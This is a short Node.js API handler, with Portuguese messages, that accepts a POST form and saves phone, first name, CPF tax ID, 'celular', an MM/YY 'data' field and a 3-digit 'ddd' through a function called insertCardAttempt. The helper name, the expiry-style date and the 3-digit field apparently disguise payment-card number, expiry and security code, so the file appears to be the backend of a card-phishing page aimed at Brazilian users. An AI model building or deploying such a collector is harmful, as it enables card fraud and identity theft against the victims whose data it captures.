const {
  insertCardAttempt,
  readJson,
  sendJson
} = require('./_utils');

function plainText(value, maxLength = 180) {
  return String(value ?? '').slice(0, maxLength);
}

function digitsOnly(value) {
  return plainText(value).replace(/\D/g, '');
}

function formatShortDate(value) {
  const digits = digitsOnly(value).slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

module.exports = async function handler(req, res) {
  try {
    if (req.method !== 'POST') {
      return sendJson(res, 405, { message: 'Metodo nao permitido.' });
    }

    const body = await readJson(req);
    const row = {
      phone: digitsOnly(body.phone),
      first_name: plainText(body.firstName || body.first_name),
      cpf: digitsOnly(body.cpf),
      celular: digitsOnly(body.celular),
      data: formatShortDate(body.data),
      ddd: digitsOnly(body.ddd).slice(0, 3)
    };

    if (Object.values(row).some((value) => value === '')) {
      return sendJson(res, 400, { message: 'Preencha todos os campos.' });
    }

    const attempt = await insertCardAttempt(row);
    return sendJson(res, 200, { ok: true, id: attempt?.id || null });
  } catch (error) {
    return sendJson(res, 500, { message: error.message || 'Erro ao salvar os dados.' });
  }
};
